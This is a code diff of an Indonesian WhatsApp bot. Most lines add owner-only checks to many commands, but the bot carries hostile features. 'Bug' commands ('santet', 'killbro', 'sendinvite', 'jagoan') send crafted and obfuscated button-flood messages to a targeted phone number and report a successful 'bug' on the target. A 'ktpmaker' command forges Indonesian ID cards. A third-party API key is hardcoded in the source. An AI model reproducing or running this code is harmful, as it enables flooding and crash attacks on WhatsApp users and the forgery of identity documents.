sleep(0x3938700),haikal[_0x56063f(0x191)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'quickReplyButton':{'displayText':'MY','id':'Anjay\x20Menger'}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':_0x56063f(0x192)}},{'quickReplyButton':{'displayText':_0x56063f(0x180),'id':_0x56063f(0x183)}}]}),await sleep(0x3938700),haikal[_0x56063f(0x191)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':_0x56063f(0x18a),'phoneNumber':_0x56063f(0x18e)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x56063f(0x18e)}},{'urlButton':{'displayText':'GROUP','url':_0x56063f(0x190)}},{'urlButton':{'displayText':_0x56063f(0x186),'url':_0x56063f(0x190)}},{'urlButton':{'displayText':'GROUP','url':_0x56063f(0x190)}},{'quickReplyButton':{'displayText':'MY','id':'Anjay\x20Menger'}},{'quickReplyButton':{'displayText':_0x56063f(0x18f),'id':_0x56063f(0x192)}},{'quickReplyButton':{'displayText':_0x56063f(0x180),'id':'JAGOAN\x20OM?'}}]}));function _0x4434(){var _0x433931=['1427860QkoqCo','GROUP','Anjay\x20Menger','1277143FrFfxI','81819XWevEu','OWNER','60ABfxKr','1761272kGDPbm','50EItJoz','62895403595055','NAME','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','sendMessage','AH\x20SLEBEEW','2583852nAJvGZ','CASPER','50KfSgLI','181sdJKuF','JAGOAN\x20OM?','595908JMBrwz'];_0x4434=function(){return _0x433931;};return _0x4434();}
+}
+break
 //=================================================//
 // BUG OWNER
 case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1484,6 +1545,7 @@ reply('sukses Bug target')
 break
 //=================================================//
 case 'jagoan' : {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!m.isGroup) return groupon(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1502,6 +1564,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 break
 //=================================================//
 case 'santetbro️': case 'killbro': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: "🗿", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -1510,6 +1573,7 @@ var _0x56063f=_0x26b9;function _0x26b9(_0x4e7e49,_0xff5729){var _0x443446=_0x443
 }
 break
 case 'btcmine': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let difikulti = [0,102,100,221,2500,1000,5002040,1428,1,2,3,4,5]
 var difikulnye = difikulti[Math.floor(Math.random() * difikulti.length)]
@@ -1528,6 +1592,7 @@ templateButtons: [
 break
 //=================================================//
 case 'tiktok': case 'tiktoknowm':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Link Nya Kak`)
 if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
@@ -1538,6 +1603,7 @@ haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${com
 break
 //=================================================//
 case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
@@ -1659,6 +1725,7 @@ haikal.sendMessage(m.chat, komo)
 }
 break
 case 'ktpmaker': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
 get_args = args.join(" ").split("|")
@@ -1706,6 +1773,7 @@ await haikal.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted
 }
 break
 case 'sticker': case 's': case 'stickergif': case 'sgif': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
 if (/image/.test(mime)) {
@@ -1724,6 +1792,7 @@ throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 D
 break
 //=================================================//
 case 'emojimix': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let [emoji1, emoji2] = text.split`+`
 if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
@@ -1737,6 +1806,7 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================//
 case 'emojimix2': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!text) throw `Example : ${prefix + command} 😅`
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
@@ -1749,6 +1819,7 @@ break
 //=================================================//
 //=================================================//
 case 'smeme': case 'stickermeme': case 'stickmeme': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!quoted) throw 'Reply Image'
 if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
@@ -1765,6 +1836,7 @@ await fs.unlinkSync(memek)
 break 
 //=================================================//
 case 'toimage': case 'toimg': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
@@ -1781,6 +1853,7 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'tomp4': case 'tovideo': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
@@ -1793,6 +1866,7 @@ await fs.unlinkSync(media)
 break
 //=================================================//
 case 'toaud': case 'toaudio': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
@@ -1804,6 +1878,7 @@ haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
 break
 //=================================================//
 case 'tovn': case 'toptt': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
@@ -1816,6 +1891,7 @@ haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {qu
 break
 //=================================================//
 case 'togif': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
@@ -1828,6 +1904,7 @@ await fs.unlinkSync(media)
 break
 //=================================================//
 case 'tourl': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
 let media = await haikal.downloadAndSaveMediaMessage(quoted)
@@ -1842,6 +1919,7 @@ await fs.unlinkSync(media)
 }
 break
 case 'pinterest': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let { pinterest } = require('./baseikal/lib/scraper')
 anu = await pinterest(text)
@@ -1851,6 +1929,7 @@ haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '
 break
 //=================================================//
 case 'couple': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
@@ -1859,6 +1938,7 @@ haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Fem
 }
 break
 case 'coffe': case 'kopi': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 const ko = {
 image: { url: 'https://coffee.alexflipnote.dev/random' },
@@ -1868,6 +1948,7 @@ haikal.sendMessage(m.chat, ko, { quoted:m })
 }
 break
 case 'kalkulator': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
 let qsd = args.join(" ")
@@ -1879,6 +1960,7 @@ m.reply(`「 Kalkulator 」\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.e
 }
 break
 case 'getname': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (qtod === "true") {
 namenye = await haikal.getName(m.quoted.sender)
@@ -1890,6 +1972,7 @@ haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
 break
 //=================================================//
 case 'getpic': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (qtod === "true") {
 try {
@@ -1939,6 +2022,7 @@ _▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY
 
 break
 case 'play': case 'ytplay': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!text) throw `Example : ${prefix + command} story wa anime`
 let yts = require("yt-search")
@@ -1969,6 +2053,7 @@ haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
 break
 //=================================================//
 case 'mediafire': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!text) throw '*Link Nyq Coy*'
 if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
@@ -2045,7 +2130,8 @@ case 'wicker':
  case 'glue': 
  case '1917': 
  case 'leaves': {
-  if (isBan) return reply(`Lah Lu Kan Di Ban`)
+  if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
 sticWait(from)
 let link
@@ -2113,6 +2199,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'transformer': case 'fomer': case 'trans':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  if(!q) return m.reply(`Penggunaan ${command} teks`)
  sticWait(from)
@@ -2125,6 +2212,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'herryp': case 'potter': case 'heryy':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
 sticWait(from)
@@ -2139,6 +2227,7 @@ maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.ht
 break
 //=================================================//
 case 'neondevil': case 'neon': case 'devil':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  if(!q) return m.reply(`Penggunaan ${command} teks`)
  sticWait(from)
@@ -2151,6 +2240,7 @@ if (isBan) return reply(`Lah Lu Kan Di Ban`)
 break
 //=================================================//
 case '3dstone': case 'stone':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
@@ -2162,6 +2252,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'thunder': case 'thun':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
@@ -2175,6 +2266,7 @@ break
 case 'graf':
 case 'graffiti':
 case 'grafiti':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
 sticWait(from)
@@ -2188,6 +2280,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'glitch3':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
 sticWait(from)
@@ -2201,6 +2294,7 @@ sticSukses(from)
 break
 //=================================================//
 case '3dbox':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
@@ -2212,6 +2306,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'drapwater': case 'water':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
@@ -2223,6 +2318,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'lion2': case 'lionn':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
@@ -2234,6 +2330,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'papercut': case 'paper': case 'cute':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
  if(!q) return m.reply(`Penggunaan ${command} teks`)
  sticWait(from)
@@ -2245,6 +2342,7 @@ if (isBan) return reply(`Lah Lu Kan Di Ban`)
 break
 //=================================================//
 case 'ytmp4': case 'ytvideo': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let { ytv } = require('./baseikal/lib/y2mate')
 if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
@@ -2256,6 +2354,7 @@ haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4
 break
 //=================================================//
 case 'q': case 'quoted': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!m.quoted) return m.reply('Reply Pesannya!!')
 let wokwol = await haikal.serializeM(await m.getQuotedObj())
@@ -2292,13 +2391,15 @@ if (isBan) return reply(`Lah Lu Kan Di Ban`)
 //=================================================//
  case 'listonline': case 'liston': {
  if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
-  if (isBan) return reply(`Lah Lu Kan Di Ban`)
+  if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
   let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
 let online = [...Object.keys(store.presences[id]), botNumber]
 haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
  }
  break
 case 'delete': case 'del': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!m.quoted) throw false
 let { chat, fromMe, id, isBaileys } = m.quoted
@@ -2338,6 +2439,7 @@ haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a =>
 break
 //=================================================//
 case 'style': case 'styletext': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 db.data.users[m.sender].limit -= 1 // -1 limit
 let { styletext } = require('./baseikal/lib/scraper')
@@ -2354,7 +2456,8 @@ break
 //=================================================//
  case 'group': case 'grup': {
  if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
-  if (isBan) return reply(`Lah Lu Kan Di Ban`)
+  if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
  if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
 if (!isAdmins) throw sticAdmin(from)
@@ -2471,6 +2574,7 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
 break
 
 case 'ss': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!text) throw `Example : ${prefix + command} Url`
 anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
@@ -2480,6 +2584,7 @@ haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, 
 break
 //=================================================//
 case 'searchgroups':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
 mel.linkwa(q)
@@ -2583,6 +2688,7 @@ reply('Sukses Change To Self')
 }
 break
 case 'listcmd': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let teks = `
 *List Cmd Sticker*
@@ -2593,6 +2699,7 @@ haikal.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticke
 break
 //=================================================//
 case 'cekbot': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let timestamp = speed()
 let latensi = speed() - timestamp
@@ -2700,7 +2807,8 @@ m.reply("Error")
 break
 //=================================================//
 	    case 'family100': {
-	    if (isBan) return reply(`Lah Lu Kan Di Ban`)
+	    if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
                 if ('family100'+m.chat in _family100) {
                     m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                     throw false
@@ -2718,6 +2826,7 @@ break
             }
             break
 case 'kuismath': case 'math': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
                 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                 let { genMath, modes } = require('./src/math')
@@ -2820,6 +2929,7 @@ Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
             }
             break
 case 'tebak': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
@@ -2911,6 +3021,7 @@ break
 
  //cr thunder
 case 'inventori': case 'inventory': case 'profile':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (!isInventory){ addInventori(m.sender) }
@@ -2934,7 +3045,8 @@ reply(teksehmazeh)
 }
 break
  case 'leaderboard': { 
- if (isBan) return reply(`Lah Lu Kan Di Ban`)
+ if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
 let txt = `「 *LEADERBOARD* 」\n\n`
 for (let i of _buruan){
 txt += `➸ *ID :* ${i.id}\n`
@@ -2949,6 +3061,7 @@ txt += `*🐘 Gajah* : ${i.gajah}\n\n`
 }
  break
 case 'mining': case 'mine':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!isInventory){ addInventori(m.sender) }
 if (isCekDarah < 1) return reply(`Kamu kelelahan!, cobalah heal menggunakan potion`) 
@@ -2988,7 +3101,8 @@ addEmerald(m.sender, emeraldnya)
 break
 //transaksi
  case 'beli': case 'buy':{
- if (isBan) return reply(`Lah Lu Kan Di Ban`) 
+ if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`) 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
  if (!isInventoryMonay){ addInventoriMonay(m.sender) }
  if (!isInventory){ addInventori(m.sender) }
@@ -3031,7 +3145,8 @@ reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Your L
  break
  
  case 'sell': case 'jual':{
- if (isBan) return reply(`Lah Lu Kan Di Ban`)
+ if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
  if (!q) return reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
  if (!isInventoryMonay){ addInventoriMonay(m.sender) }
@@ -3130,7 +3245,8 @@ reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa E
  }
  break
  case 'heal':{
- if (isBan) return reply(`Lah Lu Kan Di Ban`)
+ if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`)
  if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
  if (isCekDarah > 100) return reply('Darahmu Masih Full')
  if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
@@ -3140,7 +3256,8 @@ reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa E
  }
  break 
  case 'hunt': case 'hunting': case'berburu':{
- if (isBan) return reply(`Lah Lu Kan Di Ban`) 
+ if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
+if (isBan) return reply(`Lah Lu Kan Di Ban`) 
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
  if (isCekDarah < 1) return reply('Your Blood Is Gone, Try To Heal Using Potions') 
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
@@ -3218,36 +3335,42 @@ addGajah(m.sender, gajah)
 // # BATAS # \\
 //=================================================//
 case 'owner': case 'crator': case 'listowner':{
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 haikal.sendContact(m.chat, global.owner, m)
 }
 break
 //=================================================//
 case 'menu': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply( `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 ${menu}`)
  }
 break
 case 'bugmenu': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply( `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 ${bugmenu}` )
  }
 break
 case 'allmenu': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 ${allmenu}` )
  }
 break
 case 'textmaker': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 ${textmaker}`)
  }
 break
 case 'game': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 ${game}` )
@@ -3255,6 +3378,7 @@ ${game}` )
 break
 //=================================================/
 case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 axios.get(`https://api.waifu.pics/sfw/waifu`)
 .then(({data}) => {
@@ -3262,6 +3386,7 @@ haikal.sendImage(m.chat, data.url, mess.success, m)
 })
 break
 case 'jadian': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 if (!m.isGroup) throw groupon(from)
 let member = participants.map(u => u.id)
@@ -3327,14 +3452,16 @@ haikal.sendMessage(m.chat, { text: util.format(res.data)}, { quoted:m })
 break
 //=================================================//
 case 'sewa': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
-maaf ga nyediain sewa kalau mau jadi bot bisa chat hw mods wa.me/62895403595055`)
+maaf ga nyediain sewa kalau mau jadi bot bisa chat Casper wa.me/62895403595055`)
 }
 break
 //=================================================//
 
 case 'soundbot': {
+if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
